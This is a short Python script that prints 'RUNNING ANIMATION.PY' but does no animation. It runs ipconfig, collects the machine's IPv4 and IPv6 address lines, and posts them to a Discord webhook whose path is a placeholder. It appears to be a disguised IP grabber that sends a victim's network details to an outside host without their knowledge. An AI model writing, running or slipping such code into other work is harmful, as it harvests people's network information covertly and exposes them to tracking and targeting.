import http.client
import json
import subprocess

print("RUNNING ANIMATION.PY")



ip = []

result = subprocess.run(["cmd.exe", "/c", "ipconfig"], capture_output=True, text=True)

for line in result.stdout.splitlines():
    if "IPv4" in line:
        ip.append(line.split(":")[1].strip())
    elif "IPv6" in line:
        ip.append(line)




API = "/api/webhooks/YOUR_DISCORD_WEBHOOK"

conn = http.client.HTTPSConnection("discord.com")

payload = json.dumps({
    "content": f"IpData: {ip}"
    })

headers = {
    "Content-Type": "application/json"
    }

conn.request("POST", API, payload, headers)
